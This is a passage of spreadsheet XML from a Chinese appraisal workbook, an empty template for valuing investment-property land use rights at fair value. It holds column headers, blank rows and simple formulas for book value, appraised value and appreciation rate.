      <c r="E20" s="381" t="n"/>
      <c r="F20" s="381" t="n"/>
      <c r="G20" s="578" t="n"/>
      <c r="H20" s="380" t="n"/>
      <c r="I20" s="380" t="n"/>
      <c r="J20" s="380" t="n"/>
      <c r="K20" s="380" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="555" t="n"/>
      <c r="N20" s="555" t="n"/>
      <c r="O20" s="555" t="n"/>
      <c r="P20" s="555">
        <f>O20-N20</f>
        <v/>
      </c>
      <c r="Q20" s="555">
        <f>IF(N20=0,"",P20/N20*100)</f>
        <v/>
      </c>
      <c r="R20" s="273" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="380" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="381" t="n"/>
      <c r="F21" s="381" t="n"/>
      <c r="G21" s="578" t="n"/>
      <c r="H21" s="380" t="n"/>
      <c r="I21" s="380" t="n"/>
      <c r="J21" s="380" t="n"/>
      <c r="K21" s="380" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="555" t="n"/>
      <c r="N21" s="555" t="n"/>
      <c r="O21" s="555" t="n"/>
      <c r="P21" s="555">
        <f>O21-N21</f>
        <v/>
      </c>
      <c r="Q21" s="555">
        <f>IF(N21=0,"",P21/N21*100)</f>
        <v/>
      </c>
      <c r="R21" s="273" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="380" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="381" t="n"/>
      <c r="F22" s="381" t="n"/>
      <c r="G22" s="578" t="n"/>
      <c r="H22" s="380" t="n"/>
      <c r="I22" s="380" t="n"/>
      <c r="J22" s="380" t="n"/>
      <c r="K22" s="380" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="555" t="n"/>
      <c r="N22" s="555" t="n"/>
      <c r="O22" s="555" t="n"/>
      <c r="P22" s="555">
        <f>O22-N22</f>
        <v/>
      </c>
      <c r="Q22" s="555">
        <f>IF(N22=0,"",P22/N22*100)</f>
        <v/>
      </c>
      <c r="R22" s="273" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="380" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="381" t="n"/>
      <c r="F23" s="381" t="n"/>
      <c r="G23" s="578" t="n"/>
      <c r="H23" s="380" t="n"/>
      <c r="I23" s="380" t="n"/>
      <c r="J23" s="380" t="n"/>
      <c r="K23" s="380" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="555" t="n"/>
      <c r="N23" s="555" t="n"/>
      <c r="O23" s="555" t="n"/>
      <c r="P23" s="555">
        <f>O23-N23</f>
        <v/>
      </c>
      <c r="Q23" s="555">
        <f>IF(N23=0,"",P23/N23*100)</f>
        <v/>
      </c>
      <c r="R23" s="273" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="380" t="n"/>
      <c r="D24" s="381" t="n"/>
      <c r="E24" s="381" t="n"/>
      <c r="F24" s="381" t="n"/>
      <c r="G24" s="578" t="n"/>
      <c r="H24" s="380" t="n"/>
      <c r="I24" s="380" t="n"/>
      <c r="J24" s="380" t="n"/>
      <c r="K24" s="380" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="555" t="n"/>
      <c r="N24" s="555" t="n"/>
      <c r="O24" s="555" t="n"/>
      <c r="P24" s="555">
        <f>O24-N24</f>
        <v/>
      </c>
      <c r="Q24" s="555">
        <f>IF(N24=0,"",P24/N24*100)</f>
        <v/>
      </c>
      <c r="R24" s="273" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="380" t="n"/>
      <c r="D25" s="381" t="n"/>
      <c r="E25" s="381" t="n"/>
      <c r="F25" s="381" t="n"/>
      <c r="G25" s="578" t="n"/>
      <c r="H25" s="380" t="n"/>
      <c r="I25" s="380" t="n"/>
      <c r="J25" s="380" t="n"/>
      <c r="K25" s="380" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="555" t="n"/>
      <c r="N25" s="555" t="n"/>
      <c r="O25" s="555" t="n"/>
      <c r="P25" s="555">
        <f>O25-N25</f>
        <v/>
      </c>
      <c r="Q25" s="555">
        <f>IF(N25=0,"",P25/N25*100)</f>
        <v/>
      </c>
      <c r="R25" s="273" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="380" t="n"/>
      <c r="D26" s="381" t="n"/>
      <c r="E26" s="381" t="n"/>
      <c r="F26" s="381" t="n"/>
      <c r="G26" s="578" t="n"/>
      <c r="H26" s="380" t="n"/>
      <c r="I26" s="380" t="n"/>
      <c r="J26" s="380" t="n"/>
      <c r="K26" s="380" t="n"/>
      <c r="L26" s="555" t="n"/>
      <c r="M26" s="555" t="n"/>
      <c r="N26" s="555" t="n"/>
      <c r="O26" s="555" t="n"/>
      <c r="P26" s="555">
        <f>O26-N26</f>
        <v/>
      </c>
      <c r="Q26" s="555">
        <f>IF(N26=0,"",P26/N26*100)</f>
        <v/>
      </c>
      <c r="R26" s="273" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="593" t="n"/>
      <c r="D27" s="567" t="n"/>
      <c r="E27" s="266" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="115" t="n"/>
      <c r="H27" s="115" t="n"/>
      <c r="I27" s="115" t="n"/>
      <c r="J27" s="233" t="n"/>
      <c r="K27" s="565" t="inlineStr"/>
      <c r="L27" s="555">
        <f>SUM(L7:L26)</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>SUM(M7:M26)</f>
        <v/>
      </c>
      <c r="N27" s="555">
        <f>SUM(N7:N26)</f>
        <v/>
      </c>
      <c r="O27" s="555">
        <f>SUM(O7:O26)</f>
        <v/>
      </c>
      <c r="P27" s="555">
        <f>O27-N27</f>
        <v/>
      </c>
      <c r="Q27" s="555">
        <f>IF(N27=0,"",P27/N27*100)</f>
        <v/>
      </c>
      <c r="R27" s="602" t="inlineStr"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B28" s="380" t="inlineStr">
        <is>
          <t>减：投资性房地产减值准备</t>
        </is>
      </c>
      <c r="C28" s="593" t="n"/>
      <c r="D28" s="567" t="n"/>
      <c r="E28" s="307" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="115" t="n"/>
      <c r="H28" s="115" t="n"/>
      <c r="I28" s="115" t="n"/>
      <c r="J28" s="233" t="n"/>
      <c r="K28" s="565" t="n"/>
      <c r="L28" s="555" t="n"/>
      <c r="M28" s="555" t="n"/>
      <c r="N28" s="555" t="n"/>
      <c r="O28" s="555" t="n"/>
      <c r="P28" s="555">
        <f>O28-N28</f>
        <v/>
      </c>
      <c r="Q28" s="555">
        <f>IF(N28=0,"",P28/N28*100)</f>
        <v/>
      </c>
      <c r="R28" s="602" t="inlineStr"/>
    </row>
    <row r="29" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C29" s="593" t="n"/>
      <c r="D29" s="567" t="n"/>
      <c r="E29" s="307" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="115" t="n"/>
      <c r="H29" s="115" t="n"/>
      <c r="I29" s="115" t="n"/>
      <c r="J29" s="383" t="n"/>
      <c r="K29" s="565" t="n"/>
      <c r="L29" s="555">
        <f>L27-L28</f>
        <v/>
      </c>
      <c r="M29" s="555">
        <f>M27-M28</f>
        <v/>
      </c>
      <c r="N29" s="555">
        <f>N27-N28</f>
        <v/>
      </c>
      <c r="O29" s="555">
        <f>O27-O28</f>
        <v/>
      </c>
      <c r="P29" s="555">
        <f>O29-N29</f>
        <v/>
      </c>
      <c r="Q29" s="555">
        <f>IF(N29=0,"",P29/N29*100)</f>
        <v/>
      </c>
      <c r="R29" s="602" t="inlineStr"/>
    </row>
  </sheetData>
  <mergeCells count="8">
    <mergeCell ref="B28:D28"/>
    <mergeCell ref="B5:F5"/>
    <mergeCell ref="B2:R2"/>
    <mergeCell ref="B27:D27"/>
    <mergeCell ref="B3:R3"/>
    <mergeCell ref="B29:D29"/>
    <mergeCell ref="Q4:R4"/>
    <mergeCell ref="B1:R1"/>
  </mergeCells>
  <conditionalFormatting sqref="B6:R29">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(B6)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4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 codeName="Sheet54">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:R30"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" topLeftCell="A2" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A7" sqref="A7:A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.2"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="12.3333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="6.66666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="8.5" customWidth="1" style="410" min="7" max="7"/>
    <col width="4.83333333333333" customWidth="1" style="410" min="8" max="8"/>
    <col width="4.66666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="5.66666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col width="4.66666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col width="6.83333333333333" customWidth="1" style="410" min="12" max="12"/>
    <col width="16.3333333333333" customWidth="1" style="410" min="13" max="13"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="14" max="14"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="15" max="16"/>
    <col outlineLevel="1" width="7.5" customWidth="1" style="410" min="17" max="17"/>
    <col width="7.83333333333333" customWidth="1" style="410" min="18" max="18"/>
    <col width="9" customWidth="1" style="410" min="19" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="25.5" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>投资性房地产——土地使用权评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="18.75" customFormat="1" customHeight="1" s="368">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="261" t="inlineStr">
        <is>
          <t>（采用公允价值模式计量）</t>
        </is>
      </c>
    </row>
    <row r="3" ht="14" customHeight="1" s="415">
      <c r="A3" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B3" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="4" ht="12" customHeight="1" s="415">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="376" t="n"/>
      <c r="C4" s="547" t="n"/>
      <c r="D4" s="547" t="n"/>
      <c r="E4" s="547" t="n"/>
      <c r="F4" s="547" t="n"/>
      <c r="G4" s="547" t="n"/>
      <c r="H4" s="547" t="n"/>
      <c r="I4" s="547" t="n"/>
      <c r="J4" s="547" t="n"/>
      <c r="K4" s="547" t="n"/>
      <c r="L4" s="373" t="n"/>
      <c r="M4" s="373" t="n"/>
      <c r="N4" s="373" t="n"/>
      <c r="O4" s="373" t="n"/>
      <c r="P4" s="373" t="n"/>
      <c r="Q4" s="369" t="n"/>
      <c r="R4" s="291" t="inlineStr">
        <is>
          <t>表4-7</t>
        </is>
      </c>
    </row>
    <row r="5" ht="13.5" customHeight="1" s="415">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B5" s="601">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C5" s="554" t="n"/>
      <c r="D5" s="554" t="n"/>
      <c r="E5" s="554" t="n"/>
      <c r="F5" s="554" t="n"/>
      <c r="G5" s="347" t="n"/>
      <c r="H5" s="347" t="n"/>
      <c r="I5" s="347" t="n"/>
      <c r="J5" s="347" t="n"/>
      <c r="K5" s="347" t="n"/>
      <c r="L5" s="347" t="n"/>
      <c r="M5" s="347" t="n"/>
      <c r="N5" s="347" t="n"/>
      <c r="O5" s="347" t="n"/>
      <c r="P5" s="347" t="n"/>
      <c r="Q5" s="156" t="n"/>
      <c r="R5" s="291">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="6" ht="35.25" customFormat="1" customHeight="1" s="260">
      <c r="A6" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B6" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C6" s="177" t="inlineStr">
        <is>
          <t>土地权证编号</t>
        </is>
      </c>
      <c r="D6" s="177" t="inlineStr">
        <is>
          <t>宗地名称</t>
        </is>
      </c>
      <c r="E6" s="264" t="inlineStr">
        <is>
          <t>来源</t>
        </is>
      </c>
      <c r="F6" s="177" t="inlineStr">
        <is>
          <t>土地位置</t>
        </is>
      </c>
      <c r="G6" s="177" t="inlineStr">
        <is>
          <t>取得日期</t>
        </is>
      </c>
      <c r="H6" s="177" t="inlineStr">
        <is>
          <t>用地性质</t>
        </is>
      </c>
      <c r="I6" s="177" t="inlineStr">
        <is>
          <t>土地用途</t>
        </is>
      </c>
      <c r="J6" s="177" t="inlineStr">
        <is>
          <t>准用年限</t>
        </is>
      </c>
      <c r="K6" s="177" t="inlineStr">
        <is>
          <t>开发程度</t>
        </is>
      </c>
      <c r="L6" s="177" t="inlineStr">
        <is>
          <t>面积(m2)</t>
        </is>
      </c>
      <c r="M6" s="177" t="inlineStr">
        <is>
          <t>原始入账价值（转入日公允价值）</t>
        </is>
      </c>
      <c r="N6" s="178" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="O6" s="177" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="P6" s="177" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="Q6" s="264" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="R6" s="264" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="380" t="n"/>
      <c r="D7" s="381" t="n"/>
      <c r="E7" s="381" t="n"/>
      <c r="F7" s="381" t="n"/>
      <c r="G7" s="578" t="n"/>
      <c r="H7" s="380" t="n"/>
      <c r="I7" s="380" t="n"/>
      <c r="J7" s="380" t="n"/>
      <c r="K7" s="380" t="n"/>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="555" t="n"/>
      <c r="N7" s="555" t="n"/>
      <c r="O7" s="555" t="n"/>
      <c r="P7" s="555">
        <f>O7-N7</f>
        <v/>
      </c>
      <c r="Q7" s="555">
        <f>IF(N7=0,"",P7/N7*100)</f>
        <v/>
      </c>
      <c r="R7" s="555" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="380" t="n"/>
      <c r="D8" s="381" t="n"/>
      <c r="E8" s="381" t="n"/>
      <c r="F8" s="381" t="n"/>
      <c r="G8" s="578" t="n"/>
      <c r="H8" s="380" t="n"/>
      <c r="I8" s="380" t="n"/>
      <c r="J8" s="380" t="n"/>
      <c r="K8" s="380" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555" t="n"/>
      <c r="N8" s="555" t="n"/>
      <c r="O8" s="555" t="n"/>
      <c r="P8" s="555">
        <f>O8-N8</f>
        <v/>
      </c>
      <c r="Q8" s="555">
        <f>IF(N8=0,"",P8/N8*100)</f>
        <v/>
      </c>
      <c r="R8" s="555" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="380" t="n"/>
      <c r="D9" s="381" t="n"/>
      <c r="E9" s="381" t="n"/>
      <c r="F9" s="381" t="n"/>
      <c r="G9" s="578" t="n"/>
      <c r="H9" s="380" t="n"/>
      <c r="I9" s="380" t="n"/>
      <c r="J9" s="380" t="n"/>
      <c r="K9" s="380" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="555" t="n"/>
      <c r="N9" s="555" t="n"/>
      <c r="O9" s="555" t="n"/>
      <c r="P9" s="555">
        <f>O9-N9</f>
        <v/>
      </c>
      <c r="Q9" s="555">
        <f>IF(N9=0,"",P9/N9*100)</f>
        <v/>
      </c>
      <c r="R9" s="555" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="380" t="n"/>
      <c r="D10" s="381" t="n"/>
      <c r="E10" s="381" t="n"/>
      <c r="F10" s="381" t="n"/>
      <c r="G10" s="578" t="n"/>
      <c r="H10" s="380" t="n"/>
      <c r="I10" s="380" t="n"/>
      <c r="J10" s="380" t="n"/>
      <c r="K10" s="380" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="555" t="n"/>
      <c r="N10" s="555" t="n"/>
      <c r="O10" s="555" t="n"/>
      <c r="P10" s="555">
        <f>O10-N10</f>
        <v/>
      </c>
      <c r="Q10" s="555">
        <f>IF(N10=0,"",P10/N10*100)</f>
        <v/>
      </c>
      <c r="R10" s="555" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="380" t="n"/>
      <c r="D11" s="381" t="n"/>
      <c r="E11" s="381" t="n"/>
      <c r="F11" s="381" t="n"/>
      <c r="G11" s="578" t="n"/>
      <c r="H11" s="380" t="n"/>
      <c r="I11" s="380" t="n"/>
      <c r="J11" s="380" t="n"/>
      <c r="K11" s="380" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="555" t="n"/>
      <c r="N11" s="555" t="n"/>
      <c r="O11" s="555" t="n"/>
      <c r="P11" s="555">
        <f>O11-N11</f>
        <v/>
      </c>
      <c r="Q11" s="555">
        <f>IF(N11=0,"",P11/N11*100)</f>
        <v/>
      </c>
      <c r="R11" s="555" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="380" t="n"/>
      <c r="D12" s="381" t="n"/>
      <c r="E12" s="381" t="n"/>
      <c r="F12" s="381" t="n"/>
      <c r="G12" s="578" t="n"/>
      <c r="H12" s="380" t="n"/>
      <c r="I12" s="380" t="n"/>
      <c r="J12" s="380" t="n"/>
      <c r="K12" s="380" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="555" t="n"/>
      <c r="N12" s="555" t="n"/>
      <c r="O12" s="555" t="n"/>
      <c r="P12" s="555">
        <f>O12-N12</f>
        <v/>
      </c>
      <c r="Q12" s="555">
        <f>IF(N12=0,"",P12/N12*100)</f>
        <v/>
      </c>
      <c r="R12" s="555" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="380" t="n"/>
      <c r="D13" s="381" t="n"/>
      <c r="E13" s="381" t="n"/>
      <c r="F13" s="381" t="n"/>
      <c r="G13" s="578" t="n"/>
      <c r="H13" s="380" t="n"/>
      <c r="I13" s="380" t="n"/>
      <c r="J13" s="380" t="n"/>
      <c r="K13" s="380" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="555" t="n"/>
      <c r="N13" s="555" t="n"/>
      <c r="O13" s="555" t="n"/>
      <c r="P13" s="555">
        <f>O13-N13</f>
        <v/>
      </c>
      <c r="Q13" s="555">
        <f>IF(N13=0,"",P13/N13*100)</f>
        <v/>
      </c>
      <c r="R13" s="555" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="380" t="n"/>
      <c r="D14" s="381" t="n"/>
      <c r="E14" s="381" t="n"/>
      <c r="F14" s="381" t="n"/>
      <c r="G14" s="578" t="n"/>
      <c r="H14" s="380" t="n"/>
      <c r="I14" s="380" t="n"/>
      <c r="J14" s="380" t="n"/>
      <c r="K14" s="380" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="555" t="n"/>
      <c r="N14" s="555" t="n"/>
      <c r="O14" s="555" t="n"/>
      <c r="P14" s="555">
        <f>O14-N14</f>
        <v/>
      </c>
      <c r="Q14" s="555">
        <f>IF(N14=0,"",P14/N14*100)</f>
        <v/>
      </c>
      <c r="R14" s="555" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="380" t="n"/>
      <c r="D15" s="381" t="n"/>
      <c r="E15" s="381" t="n"/>
      <c r="F15" s="381" t="n"/>
      <c r="G15" s="578" t="n"/>
      <c r="H15" s="380" t="n"/>
      <c r="I15" s="380" t="n"/>
      <c r="J15" s="380" t="n"/>
      <c r="K15" s="380" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="555" t="n"/>
      <c r="N15" s="555" t="n"/>
      <c r="O15" s="555" t="n"/>
      <c r="P15" s="555">
        <f>O15-N15</f>
        <v/>
      </c>
      <c r="Q15" s="555">
        <f>IF(N15=0,"",P15/N15*100)</f>
        <v/>
      </c>
      <c r="R15" s="555" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="380" t="n"/>
      <c r="D16" s="381" t="n"/>
      <c r="E16" s="381" t="n"/>
      <c r="F16" s="381" t="n"/>
      <c r="G16" s="578" t="n"/>
      <c r="H16" s="380" t="n"/>
      <c r="I16" s="380" t="n"/>
      <c r="J16" s="380" t="n"/>
      <c r="K16" s="380" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="555" t="n"/>
      <c r="N16" s="555" t="n"/>
      <c r="O16" s="555" t="n"/>
      <c r="P16" s="555">
        <f>O16-N16</f>
        <v/>
      </c>
      <c r="Q16" s="555">
        <f>IF(N16=0,"",P16/N16*100)</f>
        <v/>
      </c>
      <c r="R16" s="555" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="380" t="n"/>
      <c r="D17" s="381" t="n"/>
      <c r="E17" s="381" t="n"/>
      <c r="F17" s="381" t="n"/>
      <c r="G17" s="578" t="n"/>
      <c r="H17" s="380" t="n"/>
      <c r="I17" s="380" t="n"/>
      <c r="J17" s="380" t="n"/>
      <c r="K17" s="380" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="555" t="n"/>
      <c r="N17" s="555" t="n"/>
      <c r="O17" s="555" t="n"/>
      <c r="P17" s="555">
        <f>O17-N17</f>
        <v/>
      </c>
      <c r="Q17" s="555">
        <f>IF(N17=0,"",P17/N17*100)</f>
        <v/>
      </c>
      <c r="R17" s="555" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="380" t="n"/>
      <c r="D18" s="381" t="n"/>
      <c r="E18" s="381" t="n"/>
      <c r="F18" s="381" t="n"/>
      <c r="G18" s="578" t="n"/>
      <c r="H18" s="380" t="n"/>
      <c r="I18" s="380" t="n"/>
      <c r="J18" s="380" t="n"/>
      <c r="K18" s="380" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="555" t="n"/>
      <c r="N18" s="555" t="n"/>
      <c r="O18" s="555" t="n"/>
      <c r="P18" s="555">
        <f>O18-N18</f>
        <v/>
      </c>
      <c r="Q18" s="555">
        <f>IF(N18=0,"",P18/N18*100)</f>
        <v/>
      </c>
      <c r="R18" s="555" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="380" t="n"/>
      <c r="D19" s="381" t="n"/>
      <c r="E19" s="381" t="n"/>
      <c r="F19" s="381" t="n"/>
      <c r="G19" s="578" t="n"/>
      <c r="H19" s="380" t="n"/>
      <c r="I19" s="380" t="n"/>
      <c r="J19" s="380" t="n"/>
      <c r="K19" s="380" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="555" t="n"/>
      <c r="N19" s="555" t="n"/>
      <c r="O19" s="555" t="n"/>
      <c r="P19" s="555">
        <f>O19-N19</f>
        <v/>
      </c>
      <c r="Q19" s="555">
        <f>IF(N19=0,"",P19/N19*100)</f>
        <v/>
      </c>
      <c r="R19" s="555" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="380" t="n"/>
      <c r="D20" s="381" t="n"/>
      <c r="E20" s="381" t="n"/>
      <c r="F20" s="381" t="n"/>
      <c r="G20" s="578" t="n"/>
      <c r="H20" s="380" t="n"/>
      <c r="I20" s="380" t="n"/>
      <c r="J20" s="380" t="n"/>
      <c r="K20" s="380" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="555" t="n"/>
      <c r="N20" s="555" t="n"/>
      <c r="O20" s="555" t="n"/>
      <c r="P20" s="555">
        <f>O20-N20</f>
        <v/>
      </c>
      <c r="Q20" s="555">
        <f>IF(N20=0,"",P20/N20*100)</f>
        <v/>
      </c>
      <c r="R20" s="555" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="380" t="n"/>
      <c r="D21" s="381" t="n"/>
      <c r="E21" s="381" t="n"/>
      <c r="F21" s="381" t="n"/>
      <c r="G21" s="578" t="n"/>
      <c r="H21" s="380" t="n"/>
      <c r="I21" s="380" t="n"/>
      <c r="J21" s="380" t="n"/>
      <c r="K21" s="380" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="555" t="n"/>
      <c r="N21" s="555" t="n"/>
      <c r="O21" s="555" t="n"/>
      <c r="P21" s="555">
        <f>O21-N21</f>
        <v/>
      </c>
      <c r="Q21" s="555">
        <f>IF(N21=0,"",P21/N21*100)</f>
        <v/>
      </c>
      <c r="R21" s="555" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="380" t="n"/>
      <c r="D22" s="381" t="n"/>
      <c r="E22" s="381" t="n"/>
      <c r="F22" s="381" t="n"/>
      <c r="G22" s="578" t="n"/>
      <c r="H22" s="380" t="n"/>
      <c r="I22" s="380" t="n"/>
      <c r="J22" s="380" t="n"/>
      <c r="K22" s="380" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="555" t="n"/>
      <c r="N22" s="555" t="n"/>
      <c r="O22" s="555" t="n"/>
      <c r="P22" s="555">
        <f>O22-N22</f>
        <v/>
      </c>
      <c r="Q22" s="555">
        <f>IF(N22=0,"",P22/N22*100)</f>
        <v/>
      </c>
      <c r="R22" s="555" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="380" t="n"/>
      <c r="D23" s="381" t="n"/>
      <c r="E23" s="381" t="n"/>
      <c r="F23" s="381" t="n"/>
      <c r="G23" s="578" t="n"/>
      <c r="H23" s="380" t="n"/>
      <c r="I23" s="380" t="n"/>
      <c r="J23" s="380" t="n"/>
      <c r="K23" s="380" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="555" t="n"/>
      <c r="N23" s="555" t="n"/>
      <c r="O23" s="555" t="n"/>
      <c r="P23" s="555">
        <f>O23-N23</f>
        <v/>
      </c>
      <c r="Q23" s="555">
